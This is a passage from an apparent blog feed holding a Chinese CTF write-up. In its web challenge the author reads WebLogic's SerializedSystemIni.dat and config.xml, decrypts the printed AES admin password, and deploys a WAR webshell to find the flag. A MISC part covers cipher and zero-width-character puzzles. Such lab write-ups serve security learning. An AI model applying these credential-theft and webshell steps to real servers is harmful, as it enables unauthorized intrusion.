title="web7"></a>web7</h2><p>首先尝试弱口令，无效。于是进行解密。</p><p>设置路径为./security/SerializedSystemIni.dat，使用Burp Suite抓包，将乱码部分拷贝为文件，命名为1.dat。</p><p><img src="/img/image-20211007201027297.png" alt="image-20211007201027297"></p><p>同理，设置路径为./config/config.xml，得到加密后的管理员密码为<code>&#123;AES&#125;9VgweUmigT7OjfK/quYRTd947tkcRiSnnQ1qxe1Sp/c2rUwn65ISTNaLPLxE9xLU</code></p><p>利用weblogic控制台解密工具得到管理员密码：</p><p><img src="/img/QQ%E6%88%AA%E5%9B%BE20211007125314.png" alt="QQ截图20211007125314"></p><p>进入部署页面</p><p><img src="/img/image-20211007201410823.png" alt="image-20211007201410823"></p><p>上传test0000.war木马文件，保存部署：</p><p><img src="/img/QQ%E6%88%AA%E5%9B%BE20211007131921.png" alt="QQ截图20211007131921"></p><p>访问该木马，进入文件管理页面，不断进入上层目录，发现flag.tar，但为空。于是继续进入上层目录，发现可疑文件：</p><p><img src="/img/QQ%E6%88%AA%E5%9B%BE20211007131830.png" alt="QQ截图20211007131830"></p><p>下载并用记事本打开，得到flag。</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="加密？"><a href="#加密？" class="headerlink" title="加密？"></a>加密？</h2><p>第一层：显然是福尔摩斯里的跳舞的小人，密码：SHERLOCK</p><p><img src="/img/%E5%AF%86%E7%A0%81.png" alt="密码"></p><p>进入压缩包备注中的网站，发现是零宽度字符解码网站。在Windows中打开压缩包中的<code>密码.txt</code>，无法读取零宽度字符，于是到linux系统中用vim读取，并copy到解码网站，得到压缩密码：</p><p><img src="/img/QQ%E6%88%AA%E5%9B%BE20211005182316.png" alt="QQ截图20211005182316"></p><p>打开flag.txt，使用base16解码得到flag。</p><p><img src="/img/QQ%E6%88%AA%E5%9B%BE20211005182340.png" alt="QQ截图20211005182340"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;ssti&quot;&gt;&lt;a href=&quot;#ssti&quot; class=&quot;headerlink&quot; title=&quot;ssti&quot;&gt;&lt;/a&gt;sst</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://zxy.link/tags/CTF/"/>
    
    <category term="Web" scheme="https://zxy.link/tags/Web/"/>
    
    <category term="Misc" scheme="https://zxy.link/tags/Misc/"/>
    
  </entry>
  
</feed>
